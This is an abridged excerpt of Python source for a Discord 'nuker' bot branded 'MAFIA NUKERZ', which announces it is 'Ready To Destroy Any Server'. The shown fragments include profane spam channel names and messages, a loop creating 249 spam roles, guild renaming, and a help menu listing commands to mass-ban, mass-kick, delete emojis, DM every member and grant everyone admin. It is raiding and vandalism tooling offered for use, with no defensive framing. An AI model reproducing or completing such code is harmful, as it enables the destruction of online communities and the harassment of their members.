...
CHANNEL_NAMES = ['MAFIA fucked you']

MESSAGE_CONTENTS = ['@everyone MAFIA fucked your mom https://youtube.com/channel/UCUSTyH2-SPgi2T4a6_ZR-3w YOU GOT FUCKED LOL'] 

WEBHOOK_NAMES = ["MAFIA tera baap hai"]
...
async def on_ready():
  ...
  await client.change_presence(activity=discord.Game(name= "MADE BY MAFIA "))

print('''MAFIA NUKERZ Is Ready To Destroy Any Server ! 
...
async def roles(ctx):
  ...
  for i in range(1, 250):
    ...
    try:
      ...
      await ctx.guild.create_role(name=f"RG ON TOP")
...
async def wizz(ctx, amount=50):
  ...
  await ctx.guild.edit(name="MAFIAONTOP")
...
async def help(ctx, *args):
    ...
    retStr = str("""```fix\n❄️ $wizz - fucks the server\n\n❄️ $ban - banall members(non threaded)\n\n❄️ $kick - kickall members\n\n❄️ $roles - spams roles\n\n❄️ $emojidel - deletes emojis\n\n❄️ $dmall - dms everyone in guild\n\n❄️ $name - changes guild name\n\n❄️ $admin - gives all admin```""")

    embed = discord.Embed(color=0xfffafa,title="MAFIA DELUX Nuker ❄️")

    embed.add_field(name="Help ⚠️",value=retStr)

    embed.set_footer(text=f'MAFIA ON TOP')
